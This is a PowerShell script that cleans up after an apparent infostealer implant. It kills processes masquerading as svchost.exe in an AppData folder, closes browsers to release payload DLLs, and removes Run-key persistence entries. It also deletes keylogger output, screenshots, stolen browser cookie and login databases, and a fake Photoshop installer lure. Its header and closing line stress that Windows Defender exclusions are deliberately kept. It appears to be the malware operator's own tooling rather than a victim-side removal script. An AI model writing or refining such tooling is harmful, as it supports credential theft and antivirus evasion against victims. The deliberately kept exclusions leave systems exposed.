# ===========================================================================
# cleanup_only.ps1 — remove old implant artifacts, KEEP Defender exclusions
# Run as Administrator
# ===========================================================================
$ErrorActionPreference = "SilentlyContinue"
$ip = "$env:APPDATA\Microsoft\InputPersonalization"

Write-Host "[*] Killing old processes..."
Get-Process svchost, InputPersonalization -ErrorAction SilentlyContinue |
  Where-Object { $_.Path -like "$ip*" } | Stop-Process -Force

Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
  Where-Object { $_.ExecutablePath -like "*InputPersonalization*" } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }

# Release payload DLLs held by the browser.
Get-Process chrome, msedge -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

Write-Host "[*] Removing Run keys..."
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemHealth"
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsInputPersonalization"

Write-Host "[*] Removing hidden files..."
Remove-Item "$ip\svchost.exe" -Force
Remove-Item "$ip\InputPersonalization.exe" -Force
Remove-Item "$ip\abe_*.dll" -Force

Write-Host "[*] Removing temp artifacts..."
Remove-Item "$env:TEMP\abe_*" -Force
Remove-Item "$env:TEMP\screen.jpg" -Force
Remove-Item "$env:TEMP\keylog.txt" -Force
Remove-Item "$env:TEMP\abe_cookies.db*" -Force
Remove-Item "$env:TEMP\abe_logins.db*" -Force

Write-Host "[*] Removing old downloads / extracted folders..."
Remove-Item "$env:USERPROFILE\Downloads\Photoshop_2024_Setup*" -Force
Remove-Item "$env:USERPROFILE\Desktop\Photoshop_2024_Setup" -Recurse -Force
Remove-Item "$env:USERPROFILE\Desktop\test" -Recurse -Force

Write-Host ""
Write-Host "[*] Verify (expect no process / no key / False / no files):"
Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
  Where-Object { $_.ExecutablePath -like "*InputPersonalization*" } |
  Select-Object ProcessId, ExecutablePath

Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name WindowsSystemHealth, WindowsInputPersonalization

Test-Path "$ip\svchost.exe"
Test-Path "$ip\InputPersonalization.exe"
Get-ChildItem "$env:TEMP\abe_*" -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "Done. Defender exclusions were kept."
